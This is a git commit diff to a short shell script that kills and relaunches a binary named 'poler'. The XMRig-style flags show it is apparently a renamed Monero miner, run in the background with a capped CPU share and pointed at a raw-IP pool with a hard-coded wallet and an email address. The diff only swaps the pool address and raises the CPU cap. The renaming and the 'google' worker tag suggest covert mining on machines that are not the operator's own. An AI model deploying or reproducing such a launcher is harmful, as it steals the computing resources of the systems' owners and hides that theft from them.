46dd7a4a972476374dd854d2dc9d90207e4f542f
today100not <56802907+today100not@users.noreply.github.com>
2019-10-22 08:10:26 -0400

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 84 --cpu-priority 3 -o 185.209.29.249:5577 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6  --pass=01-google-10222019:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 86 --cpu-priority 3 -o 185.209.29.180:5522 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6  --pass=01-google-10222019:robbertopp1@gmail.com -k
